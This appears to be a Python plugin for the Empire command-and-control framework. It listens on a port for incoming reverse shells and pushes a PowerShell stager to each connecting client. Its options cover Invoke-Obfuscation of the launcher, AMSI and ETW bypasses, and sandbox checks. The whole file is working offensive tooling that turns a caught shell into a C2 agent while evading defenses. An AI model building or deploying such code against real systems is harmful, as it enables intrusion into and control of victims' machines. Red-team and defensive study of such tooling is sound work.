import contextlib
import logging
import socket
from typing import override

from empire.server.common import helpers
from empire.server.core.plugins import BasePlugin

log = logging.getLogger(__name__)


class Plugin(BasePlugin):
    @override
    def on_load(self, db):
        self.execution_enabled = False

        self.settings_options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "LocalHost": {
                "Description": "Address for the reverse shell to connect back to.",
                "Required": True,
                "Value": "0.0.0.0",
            },
            "LocalPort": {
                "Description": "Port on local host for the reverse shell.",
                "Required": True,
                "Value": "9999",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": False,
                "Value": "launcher.exe",
            },
            "Base64": {
                "Description": "Switch. Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
        }

    @override
    def on_start(self, db):
        current_settings = self.current_settings(db)
        language = current_settings["Language"]
        listener_name = current_settings["Listener"]
        base64 = current_settings["Base64"]
        obfuscate = current_settings["Obfuscate"]
        obfuscate_command = current_settings["ObfuscateCommand"]
        user_agent = current_settings["UserAgent"]
        proxy = current_settings["Proxy"]
        proxy_creds = current_settings["ProxyCreds"]
        stager_retries = current_settings["StagerRetries"]
        safe_checks = current_settings["SafeChecks"]
        lhost = current_settings["LocalHost"]
        lport = current_settings["LocalPort"]
        encode = base64.lower() == "true"
        invoke_obfuscation = obfuscate.lower() == "true"

        launcher = self.current_internal_state(db).get("Launcher")
        if not launcher:
            launcher = self.main_menu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                safe_checks=safe_checks,
                bypasses=current_settings["Bypasses"],
            )

            if launcher == "":
                return False, "[!] Error in launcher command generation."

        # Setting in-memory so it can have repetitive access without querying the db.
        self.launcher = launcher
        # Setting in the db so it persists across restarts.
        self.set_internal_state_option(db, "Launcher", launcher)

        self.reverseshell_proc = helpers.KThread(
            target=self.server_listen, args=(str(lhost), str(lport))
        )
        self.reverseshell_proc.daemon = True
        self.reverseshell_proc.start()
        return None

    @override
    def on_stop(self, db):
        with contextlib.suppress(Exception):
            self.reverseshell_proc.kill()
            self.thread.kill()

    def client_handler(self, client_socket):
        self.thread = helpers.KThread(target=self.o, args=[client_socket])
        self.thread.daemon = True
        self.thread.start()
        try:
            buffer = self.launcher + "\n"
            client_socket.send(buffer.encode())
        except KeyboardInterrupt:
            client_socket.close()
        except Exception:
            client_socket.close()

    def server_listen(self, host, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((host, int(port)))
        except Exception:
            return f"[!] Can't bind at {host}:{port}"

        self.send_socketio_message(f"Listening on {port} ...")
        server.listen(5)

        try:
            while self.enabled:
                client_socket, addr = server.accept()
                self.client_handler(client_socket)
        except KeyboardInterrupt:
            return None

    def o(self, s):
        while 1:
            try:
                data = ""
                while 1:
                    packet = s.recv(1024)
                    data += packet.decode()
                    if len(packet) < 1024:
                        break
                if not len(data):
                    s.close()
                    break
            except Exception:
                s.close()
                break
